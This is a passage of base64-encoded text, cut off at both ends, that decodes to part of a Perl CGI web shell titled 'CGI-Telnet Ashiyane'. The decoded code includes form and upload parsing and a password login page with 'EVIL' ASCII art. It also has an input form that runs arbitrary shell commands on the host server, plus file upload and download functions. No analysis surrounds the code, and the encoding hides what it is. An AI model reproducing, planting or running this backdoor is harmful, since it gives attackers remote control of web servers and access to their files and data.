0YSBpcyBzdG9yZWQgaW4gJGlueydmaWxlZGF0YSd9Lg0KIyBPdGhlciB2YXJpYWJsZXMgY2FuIGJlIGFjY2Vzc2VkIHVzaW5nICRpbnsndmFyJ30sIHdoZXJlIHZhciBpcyB0aGUgbmFtZSBvZg0KIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQ0KIyBzY3JpcHRzLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJlYWRQYXJzZSANCnsNCglsb2NhbCAoKmluKSA9IEBfIGlmIEBfOw0KCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7DQoJDQoJJE11bHRpcGFydEZvcm1EYXRhID0gJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC87DQoNCglpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJHRVQiKQ0KCXsNCgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQoJfQ0KCWVsc2lmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIlBPU1QiKQ0KCXsNCgkJYmlubW9kZShTVERJTikgaWYgJE11bHRpcGFydEZvcm1EYXRhICYgJFdpbk5UOw0KCQlyZWFkKFNURElOLCAkaW4sICRFTlZ7J0NPTlRFTlRfTEVOR1RIJ30pOw0KCX0NCg0KCSMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGENCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykNCgl7DQoJCSRCb3VuZGFyeSA9ICctLScuJDE7ICMgcGxlYXNlIHJlZmVyIHRvIFJGQzE4NjcgDQoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IA0KCQkkSGVhZGVyQm9keSA9ICRsaXN0WzFdOw0KCQkkSGVhZGVyQm9keSA9fiAvXHJcblxyXG58XG5cbi87DQoJCSRIZWFkZXIgPSAkYDsNCgkJJEJvZHkgPSAkJzsNCiAJCSRCb2R5ID1+IHMvXHJcbiQvLzsgIyB0aGUgbGFzdCBcclxuIHdhcyBwdXQgaW4gYnkgTmV0c2NhcGUNCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7DQoJCSRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsgDQoJCSRpbnsnZid9ID0gJDE7IA0KCQkkaW57J2YnfSA9fiBzL1wiLy9nOw0KCQkkaW57J2YnfSA9fiBzL1xzLy9nOw0KDQoJCSMgcGFyc2UgdHJhaWxlcg0KCQlmb3IoJGk9MjsgJGxpc3RbJGldOyAkaSsrKQ0KCQl7IA0KCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87DQoJCQkkbGlzdFskaV0gPX4gL1wiKFx3KylcIi87DQoJCQkka2V5ID0gJDE7DQoJCQkkdmFsID0gJCc7DQoJCQkkdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOw0KCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSRpbnska2V5fSA9ICR2YWw7IA0KCQl9DQoJfQ0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQ0KCXsNCgkJQGluID0gc3BsaXQoLyYvLCAkaW4pOw0KCQlmb3JlYWNoICRpICgwIC4uICQjaW4pDQoJCXsNCgkJCSRpblskaV0gPX4gcy9cKy8gL2c7DQoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOw0KCQkJJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsNCgkJCSRpbnska2V5fSAuPSAkdmFsOw0KCQl9DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBQYWdlIEhlYWRlcg0KIyBBcmd1bWVudCAxOiBGb3JtIGl0ZW0gbmFtZSB0byB3aGljaCBmb2N1cyBzaG91bGQgYmUgc2V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlSGVhZGVyDQp7DQoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7DQoJJEVuY29kZWRDdXJyZW50RGlyID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCglwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCglwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQo8dGl0bGU+QXNoaXlhbmU8L3RpdGxlPg0KJEh0bWxNZXRhSGVhZGVyDQo8L2hlYWQ+DQo8Ym9keSBvbkxvYWQ9ImRvY3VtZW50LmYuQF8uZm9jdXMoKSIgYmdjb2xvcj0iIzAwMDAwMCIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4NCjx0YWJsZSBib3JkZXI9IjEiIHdpZHRoPSIxMDAlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjIiPg0KPHRyPg0KPHRkIGJnY29sb3I9IiNDMkJGQTUiIGJvcmRlcmNvbG9yPSIjMDAwMDgwIiBhbGlnbj0iY2VudGVyIj4NCjxiPjxmb250IGNvbG9yPSIjMDAwMDgwIiBzaXplPSIyIj4jPC9mb250PjwvYj48L3RkPg0KPHRkIGJnY29sb3I9IiMwMDAwODAiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiIGNvbG9yPSIjMDA5OTAwIj48Yj5DR0ktVGVsbmV0IEFzaGl5YW5lIENvbm5lY3RlZCB0byAkU2VydmVyTmFtZTwvYj48L2ZvbnQ+PC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQgY29sc3Bhbj0iMiIgYmdjb2xvcj0iI0MyQkZBNSI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT11cGxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPlVwbG9hZCBGaWxlPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWxvZ291dCI+RGlzY29ubmVjdDwvYT4gfA0KPGEgaHJlZj0iVU5JVFhfVEVBTUBIT1RNQUlMLkNPTSI+SGVscDwvYT4NCjwvZm9udD48L3RkPg0KPC90cj4NCjwvdGFibGU+DQo8Zm9udCBjb2xvcj0iIzAwOTkwMCIgc2l6ZT0iMyI+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5TY3JlZW4NCnsNCgkkTWVzc2FnZSA9IHEkPHByZT48Zm9udCBjb2xvcj0iI2ZmMDAwMCI+IF9fX19fICBfX19fXyAgX19fX18gICAgICAgICAgX19fX18gICAgICAgIF8gICAgICAgICAgICAgICBfDQovICBfXyBcfCAgX18gXHxfICAgX3wgICAgICAgIHxfICAgX3wgICAgICB8IHwgICAgICAgICAgICAgfCB8DQp8IC8gIFwvfCB8ICBcLyAgfCB8ICAgX19fX19fICAgfCB8ICAgIF9fXyB8IHwgXyBfXyAgICBfX18gfCB8Xw0KfCB8ICAgIHwgfCBfXyAgIHwgfCAgfF9fX19fX3wgIHwgfCAgIC8gXyBcfCB8fCAnXyBcICAvIF8gXHwgX198DQp8IFxfXy9cfCB8X1wgXCBffCB8XyAgICAgICAgICAgfCB8ICB8ICBfXy98IHx8IHwgfCB8fCAgX18vfCB8Xw0KIFxfX19fLyBcX19fXy8gXF9fXy8gICAgICAgICAgIFxfLyAgIFxfX198fF98fF98IHxffCBcX19ffCBcX198IDEuMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCjwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+ICAgICAgICAgICAgICAgICAgICAgIF9fX19fXyAgICAgICAgICAgICA8L2ZvbnQ+PGZvbnQgY29sb3I9IiNBRTgzMDAiPsKpIDIwMDMsIEFzaGl5YW5lPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4NCiAgICAgICAgICAgICAgICAgICAuLSZxdW90OyAgICAgICZxdW90Oy0uDQogICAgICAgICAgICAgICAgICAvICAgVU5JVC1YICAgXA0KICAgICAgICAgICAgICAgICB8ICAgICAgICAgICAgICB8DQogICAgICAgICAgICAgICAgIHwsICAuLS4gIC4tLiAgLHwNCiAgICAgICAgICAgICAgICAgfCApKF9vLyAgXG9fKSggfA0KICAgICAgICAgICAgICAgICB8LyAgICAgL1wgICAgIFx8DQogICAgICAgKEBfICAgICAgIChfICAgICBeXiAgICAgXykNCiAgXyAgICAgKSBcPC9mb250Pjxmb250IGNvbG9yPSIjMDA5OTAwIj5fX19fX19fPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj5cPC9mb250Pjxmb250IGNvbG9yPSIjMDA5OTAwIj5fXzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+fCpFVklMKnw8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDk5MDAiPl9fPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4vPC9mb250Pjxmb250IGNvbG9yPSIjMDA5OTAwIj5fX19fX19fX19fX19fX19fX19fX19fXw0KPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4gKF8pPC9mb250Pjxmb250IGNvbG9yPSIjMDA5OTAwIj5AOEA4PC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj57fTwvZm9udD48Zm9udCBjb2xvcj0iIzAwOTkwMCI+Jmx0O19fX19fX19fPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj58LVxNQVNURVIvLXw8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDk5MDAiPl9fX19fX19fX19fX19fX19fX19fX19fXyZndDs8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPg0KICAgICAgICApXy8gICAgICAgIFwgICAgICAgICAgLyANCiAgICAgICAoQCAgICAgICAgICAgYC0tLS0tLS0tYA0KICAgICAgICAgICAgIDwvZm9udD48Zm9udCBjb2xvcj0iI0FFODMwMCI+VyBBIFIgTiBJIE4gRzogUHJpdmF0ZSBTZXJ2ZXI8L2ZvbnQ+PC9wcmU+DQokOw0KIycNCglwcmludCA8PEVORDsNCjxjb2RlPg0KVHJ5aW5nICRTZXJ2ZXJOYW1lLi4uPGJyPg0KQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPGJyPg0KRXNjYXBlIGNoYXJhY3RlciBpcyBeXQ0KPGNvZGU+JE1lc3NhZ2UNCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQ0Kew0KCXByaW50IDw8RU5EOw0KPGNvZGU+DQo8YnI+bG9naW46IGFkbWluPGJyPg0KcGFzc3dvcmQ6PGJyPg0KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpbkZvcm0NCnsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0ibG9naW4iPg0KbG9naW46IGFkbWluPGJyPg0KcGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQo8L2NvZGU+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIGZvb3RlciBmb3IgdGhlIEhUTUwgUGFnZQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUZvb3Rlcg0Kew0KCXByaW50ICI8L2ZvbnQ+PC9ib2R5PjwvaHRtbD4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlDQojIHZhcmlhYmxlICRDb29raWVzeycnfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEdldENvb2tpZXMNCnsNCglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOw0KCWZvcmVhY2ggJGNvb2tpZShAaHR0cGNvb2tpZXMpDQoJew0KCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7DQoJCSRDb29raWVzeyRpZH0gPSAkdmFsOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dvdXRTY3JlZW4NCnsNCglwcmludCAiPGNvZGU+Q29ubmVjdGlvbiBjbG9zZWQgYnkgZm9yZWlnbiBob3N0Ljxicj48YnI+PC9jb2RlPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2Fpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dvdXQNCnsNCglwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9O1xuIjsgIyByZW1vdmUgcGFzc3dvcmQgY29va2llDQoJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCSZQcmludExvZ291dFNjcmVlbjsNCgkmUHJpbnRMb2dpblNjcmVlbjsNCgkmUHJpbnRMb2dpbkZvcm07DQoJJlByaW50UGFnZUZvb3RlcjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBsb2dpbiB0aGUgdXNlci4gSWYgdGhlIHBhc3N3b3JkIG1hdGNoZXMsIGl0DQojIGRpc3BsYXlzIGEgcGFnZSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBydW4gY29tbWFuZHMuIElmIHRoZSBwYXNzd29yZCBkb2Vucyd0DQojIG1hdGNoIG9yIGlmIG5vIHBhc3N3b3JkIGlzIGVudGVyZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlcg0KIyB0byBsb2dpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dpbiANCnsNCglpZigkTG9naW5QYXNzd29yZCBlcSAkUGFzc3dvcmQpICMgcGFzc3dvcmQgbWF0Y2hlZA0KCXsNCgkJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPSRMb2dpblBhc3N3b3JkO1xuIjsNCgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQoJZWxzZSAjIHBhc3N3b3JkIGRpZG4ndCBtYXRjaA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCQkmUHJpbnRMb2dpblNjcmVlbjsNCgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZA0KCQl7DQoJCQkmUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2U7DQoJCX0NCgkJJlByaW50TG9naW5Gb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBjb21tYW5kcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KJFByb21wdA0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlRG93bmxvYWRGb3JtDQp7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+DQokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KPGZvcm0gbmFtZT0iZiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQokUHJvbXB0IHVwbG9hZDxicj48YnI+DQpGaWxlbmFtZTogPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPg0KT3B0aW9uczogJm5ic3A7PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJvIiB2YWx1ZT0ib3ZlcndyaXRlIj4NCk92ZXJ3cml0ZSBpZiBpdCBFeGlzdHM8YnI+PGJyPg0KVXBsb2FkOiZuYnNwOyZuYnNwOyZuYnNwOzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9InVwbG9hZCI+DQo8L2Zvcm0+DQo8L2NvZGU+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bw0KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzDQojIG5ldmVyIGNhbGxlZCB3aGVuIHRoZSBzY3JpcHQgaXMgcnVubmluZyBvbiBOVC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBDb21tYW5kVGltZW91dA0Kew0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgkJcHJpbnQgPDxFTkQ7DQo8L3htcD4NCjxjb2RlPg0KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLg0KPGJyPktpbGxlZCBpdCENCjxjb2RlPg0KRU5EDQoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCQlleGl0Ow0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBleGVjdXRlIGNvbW1hbmRzLiBJdCBkaXNwbGF5cyB0aGUgb3V0cHV0IG9mIHRoZQ0KIyBjb21tYW5kIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgYW5vdGhlciBjb21tYW5kLiBUaGUgY2hhbmdlIGRpcmVjdG9yeQ0KIyBjb21tYW5kIGlzIGhhbmRsZWQgZGlmZmVyZW50bHkuIEluIHRoaXMgY2FzZSwgdGhlIG5ldyBkaXJlY3RvcnkgaXMgc3RvcmVkIGluDQojIGFuIGludGVybmFsIHZhcmlhYmxlIGFuZCBpcyB1c2VkIGVhY2ggdGltZSBhIGNvbW1hbmQgaGFzIHRvIGJlIGV4ZWN1dGVkLiBUaGUNCiMgb3V0cHV0IG9mIHRoZSBjaGFuZ2UgZGlyZWN0b3J5IGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZCB0byB0aGUgdXNlcnMNCiMgdGhlcmVmb3JlIGVycm9yIG1lc3NhZ2VzIGNhbm5vdCBiZSBkaXNwbGF5ZWQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgRXhlY3V0ZUNvbW1hbmQNCnsNCglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kDQoJew0KCQkjIHdlIGNoYW5nZSB0aGUgZGlyZWN0b3J5IGludGVybmFsbHkuIFRoZSBvdXRwdXQgb2YgdGhlDQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLg0KCQkNCgkJJE9sZERpciA9ICRDdXJyZW50RGlyOw0KCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJy